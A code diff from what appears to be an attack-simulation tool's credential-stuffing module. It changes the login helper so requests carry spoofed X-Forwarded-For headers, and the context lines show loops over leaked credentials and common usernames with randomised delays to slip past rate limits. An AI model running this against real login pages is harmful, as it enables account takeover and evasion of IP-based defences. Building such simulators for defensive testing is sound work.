@@ -89,7 +89,7 @@ def run(
         if u_hint and p_hint:
             if slow_mode:
                 time.sleep(random.uniform(1.0, 3.0))
-            ev = _try_login(login_url, u_hint, p_hint)
+            ev = _try_login(state, login_url, u_hint, p_hint)
             if ev:
                 return ev
 
@@ -98,7 +98,7 @@ def run(
     for username, password in _LEAKED_CREDENTIALS:
         if slow_mode:
             time.sleep(random.uniform(1.0, 5.0))
-        ev = _try_login(login_url, username, password)
+        ev = _try_login(state, login_url, username, password)
         if ev:
             return ev
 
@@ -107,7 +107,7 @@ def run(
         for username in _COMMON_USERNAMES[:6]:
             if slow_mode:
                 time.sleep(random.uniform(0.5, 2.0))
-            ev = _try_login(login_url, username, password)
+            ev = _try_login(state, login_url, username, password)
             if ev:
                 return ev
 
@@ -124,10 +124,15 @@ def run(
     )
 
 
-def _try_login(url: str, username: str, password: str) -> Optional[AttackEvent]:
+def _try_login(
+    state: SystemState, url: str, username: str, password: str
+) -> Optional[AttackEvent]:
     """POST JSON login; returns AttackEvent on terminal outcome, None to try next pair."""
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
+        with httpx.Client(
+            timeout=_CLIENT_TIMEOUT,
+            headers=eh.merge_xff_headers(state, {}),
+        ) as client:
             r = client.post(url, json={"username": username, "password": password})
     except Exception as e:
         return AttackEvent(
